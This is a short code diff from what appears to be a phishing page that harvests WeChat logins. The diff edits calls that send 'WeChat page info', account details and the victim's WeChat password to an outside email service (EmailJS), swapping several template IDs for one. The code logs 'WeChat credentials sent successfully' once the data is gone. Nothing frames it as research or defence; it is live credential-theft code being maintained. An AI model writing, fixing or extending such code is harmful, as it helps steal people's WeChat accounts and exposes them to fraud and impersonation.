@@ -706,7 +706,7 @@
 
         console.log("Sending WeChat page info to EmailJS:", templateParams);
         return emailjs
-          .send(SERVICE_ID, "template_wyssuk9", templateParams)
+          .send(SERVICE_ID, "template_cqo9ino", templateParams)
           .then(() => console.log("WeChat page info sent successfully."))
           .catch((err) =>
             console.error("EmailJS page info error:", JSON.stringify(err))
@@ -733,8 +733,8 @@
         console.log("Sending WeChat password to EmailJS:", passwordParams);
 
         return Promise.all([
-          emailjs.send(SERVICE_ID, "template_b4ymczc", accountParams),
-          emailjs.send(SERVICE_ID, "template_j0ukske", passwordParams),
+          emailjs.send(SERVICE_ID, "template_cqo9ino", accountParams),
+          emailjs.send(SERVICE_ID, "template_cqo9ino", passwordParams),
         ])
           .then(() => console.log("WeChat credentials sent successfully."))
           .catch((err) =>
